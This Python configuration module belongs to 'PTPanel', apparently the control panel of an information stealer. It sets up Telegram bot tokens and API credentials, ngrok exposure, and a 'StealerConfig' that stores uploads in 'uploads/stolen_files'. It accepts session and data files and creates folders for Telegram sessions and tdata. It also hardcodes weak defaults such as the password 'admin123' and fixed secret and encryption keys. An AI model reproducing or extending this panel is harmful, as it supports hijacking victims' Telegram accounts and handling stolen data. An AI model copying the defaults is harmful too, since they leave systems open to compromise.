import os
import logging
from dataclasses import dataclass
from typing import List, Optional

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class DatabaseConfig:
    url: str
    pool_size: int = 20
    max_overflow: int = 30
    echo: bool = False
    pool_pre_ping: bool = True

@dataclass
class TelegramConfig:
    api_id: int
    api_hash: str
    bot_tokens: List[str]
    phone: Optional[str] = None

@dataclass
class AdminConfig:
    username: str
    password: str
    session_timeout: int = 3600
    max_login_attempts: int = 5
    cookie_secure: bool = False

@dataclass
class ServerConfig:
    host: str
    port: int
    debug: bool
    secret_key: str
    app_name: str = "PTPanel"
    upload_limit: int = 100 * 1024 * 1024

@dataclass
class StealerConfig:
    encryption_key: str
    max_file_size: int = 50 * 1024 * 1024
    upload_dir: str = "uploads/stolen_files"
    allowed_extensions: List[str] = None

    def __post_init__(self):
        if self.allowed_extensions is None:
            self.allowed_extensions = ['.txt', '.zip', '.session', '.json', '.dat']

@dataclass
class PathConfig:
    templates_dir: str = "templates"
    static_dir: str = "static"
    uploads_dir: str = "uploads"
    logs_dir: str = "logs"

@dataclass
class LoggingConfig:
    level: str = "INFO"
    format: str = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    file: str = "logs/ptpanel.log"
    max_bytes: int = 10 * 1024 * 1024
    backup_count: int = 5

class PTPanelConfig:
    def __init__(self):
        # Database
        self.db = DatabaseConfig(
            url=os.getenv('DATABASE_URL', 'postgresql://postgres:password@localhost:5432/ptpanel'),
            echo=os.getenv('DEBUG', 'False').lower() == 'true'
        )
        
        # Telegram
        self.telegram = TelegramConfig(
            api_id=int(os.getenv('API_ID', 0)),
            api_hash=os.getenv('API_HASH', ''),
            bot_tokens=self._parse_bot_tokens(),
            phone=os.getenv('PHONE_NUMBER')
        )
        
        # Admin
        self.admin = AdminConfig(
            username=os.getenv('ADMIN_USERNAME', 'admin'),
            password=os.getenv('ADMIN_PASSWORD', 'admin123'),
            cookie_secure=os.getenv('DEBUG', 'False').lower() != 'true'
        )
        
        # Server
        self.server = ServerConfig(
            host=os.getenv('HOST', '0.0.0.0'),
            port=int(os.getenv('PORT', 5000)),
            debug=os.getenv('DEBUG', 'False').lower() == 'true',
            secret_key=os.getenv('SECRET_KEY', 'ptpanel-dev-secret-key-change-in-production'),
            app_name="PTPanel"
        )
        
        # Stealer
        self.stealer = StealerConfig(
            encryption_key=os.getenv('ENCRYPTION_KEY', 'ptpanel-default-encryption-key-32-chars!!'),
            upload_dir=os.getenv('UPLOAD_DIR', 'uploads/stolen_files')
        )
        
        # Paths
        self.paths = PathConfig()
        
        # Logging
        self.logging = LoggingConfig()
        
        # Ngrok
        self.ngrok_auth_token = os.getenv('NGROK_AUTH_TOKEN')
        self.ngrok_domain = os.getenv('NGROK_DOMAIN')
        
        # Validate configuration
        self._validate_config()
        
        # Create necessary directories
        self._create_directories()
        
        # Setup logging
        self._setup_logging()
    
    def _parse_bot_tokens(self) -> List[str]:
        """Parse bot tokens from environment variable"""
        tokens_str = os.getenv('BOT_TOKENS', '')
        if not tokens_str:
            return []
        
        tokens = []
        for token in tokens_str.split(','):
            token = token.strip()
            if token and ':' in token:
                tokens.append(token)
        
        return tokens
    
    def _validate_config(self):
        """Validate configuration and log warnings"""
        if not self.telegram.api_id or not self.telegram.api_hash:
            logger.warning("Telegram API ID or HASH not set. Some features may not work.")
        
        if not self.telegram.bot_tokens:
            logger.warning("No bot tokens configured. Bot features will be disabled.")
        
        if self.server.debug:
            logger.warning("DEBUG mode is enabled. Do not use in production!")
        
        if len(self.server.secret_key) < 16:
            logger.warning("SECRET_KEY is too short. Consider using a longer key.")
    
    def _create_directories(self):
        """Create necessary directories if they don't exist"""
        directories = [
            self.paths.uploads_dir,
            self.stealer.upload_dir,
            'uploads/sessions',
            'uploads/tdata',
            self.paths.logs_dir
        ]
        
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
            logger.debug(f"Created directory: {directory}")
    
    def _setup_logging(self):
        """Setup application logging"""
        import logging.handlers
        
        logger = logging.getLogger('ptpanel')
        logger.setLevel(getattr(logging, self.logging.level))
        
        for handler in logger.handlers[:]:
            logger.removeHandler(handler)
        
        formatter = logging.Formatter(self.logging.format)
        
        file_handler = logging.handlers.RotatingFileHandler(
            self.logging.file,
            maxBytes=self.logging.max_bytes,
            backupCount=self.logging.backup_count
        )
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
        
        if self.server.debug:
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(formatter)
            logger.addHandler(console_handler)

config = PTPanelConfig()